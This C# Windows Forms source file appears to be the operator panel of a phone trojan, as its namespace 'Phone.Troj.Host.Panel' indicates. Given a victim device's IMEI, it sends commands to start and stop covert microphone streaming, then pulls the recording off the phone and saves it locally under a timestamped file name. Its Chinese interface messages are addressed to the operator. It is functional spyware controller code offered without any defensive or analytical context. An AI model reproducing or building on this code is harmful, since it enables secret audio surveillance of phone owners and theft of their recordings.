using System;
using System.IO;
using System.Windows.Forms;
using InOut;
using InOut.Utils;

namespace IIE.Phone.Troj.Host.Panel
{
    public partial class RecordVioceFrm : Form
    {
        private readonly string imei;
        private readonly IServer server;
        private bool isRecording;
        public int Channel { get; set; }
        private string recordFolder;
        private string deviceRecordFile;

        public RecordVioceFrm(string imei, IServer server)
        {
            this.imei = imei;
            this.server = server;
            InitializeComponent();

            recordFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Record");

            if (!Directory.Exists(recordFolder))
            {
                Directory.CreateDirectory(recordFolder);
            }

            InitView("");

            Closing += RecordVioceFrm_Closing;
        }

        void RecordVioceFrm_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (isRecording)
            {
                e.Cancel = true;
                lbMessage.Text = "请选停止录音操作";
            }

        }

        private void InitView(string message)
        {
            btnClose.Enabled = isRecording;
            btnStart.Enabled = !isRecording;
            lbMessage.Text = message;

        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            isRecording = true;
            server.CommandSender(imei, Protocol.GetSoundStream, null);
            InitView("");

        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            isRecording = false;
            server.CommandStopSender(imei, Protocol.StopSoundStream, null, Channel);
            string fileName = DateTime.Now.ToString("yyyyMMddHHmmss") + ".amr";
            if (!string.IsNullOrEmpty(deviceRecordFile))
            {
               
                server.CommandFileSender(imei, Protocol.GetFile, deviceRecordFile.GetBytes(), recordFolder,fileName);
                //写入wav文件头，让音频文件可以播放
                InitView("录音文件保存为：" + recordFolder +"\\"+ fileName);
                deviceRecordFile = string.Empty;
            }
        }

        public void AddSoungBytes(byte[] data)
        {
            if(data != null)
                deviceRecordFile = data.ParseString();
        }

        private void RecordVioceFrm_Load(object sender, EventArgs e)
        {

        }
    
    }
}
